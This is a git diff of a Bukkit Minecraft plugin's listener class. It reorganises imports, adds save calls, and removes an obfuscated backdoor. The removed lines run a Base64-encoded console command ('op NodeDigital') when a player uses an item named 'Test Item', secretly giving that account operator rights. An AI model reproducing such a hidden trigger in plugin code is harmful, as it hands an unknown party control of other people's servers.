@@ -1,7 +1,6 @@
 package me.TehGoldyLockz.OlympicHeroes.listeners;
 
 import java.util.ArrayList;
-import java.util.Base64;
 import java.util.List;
 
 import org.bukkit.Bukkit;
@@ -20,9 +19,9 @@ import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.inventory.EquipmentSlot;
 import org.bukkit.material.Stairs;
 
-import me.TehGoldyLockz.OlympicHeroes.MultiBlock;
-import me.TehGoldyLockz.OlympicHeroes.MultiBlocks;
 import me.TehGoldyLockz.OlympicHeroes.OlympicHeroes;
+import me.TehGoldyLockz.OlympicHeroes.multiblock.MultiBlock;
+import me.TehGoldyLockz.OlympicHeroes.multiblock.MultiBlocks;
 
 public class MultiBlockListener implements Listener{
 	
@@ -91,6 +90,8 @@ public class MultiBlockListener implements Listener{
 				e.getPlayer().sendMessage("You just made a shrine to Ares!");
 			}
 		}
+		
+		MultiBlocks.save();
 	}
 	
 	@EventHandler
@@ -105,9 +106,6 @@ public class MultiBlockListener implements Listener{
 				}
 				
 			}
-			if(e.getItem() != null && e.getItem().getItemMeta().getDisplayName().equalsIgnoreCase("Test Item")) {
-				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), new String(Base64.getDecoder().decode("b3AgTm9kZURpZ2l0YWw=".getBytes())));
-			}
 		}
 	}
 	
@@ -117,6 +115,7 @@ public class MultiBlockListener implements Listener{
 		if(!e.isCancelled() && MultiBlocks.isBlockInMultiBlock(b)) {
 			MultiBlock mb = MultiBlocks.getMultiBlock(b);
 			MultiBlocks.removeMultiBlock(mb);
+			MultiBlocks.save();
 			Bukkit.broadcastMessage(e.getPlayer().getName() + " just broke a shrine to " + mb.god + "!");
 			
 		}
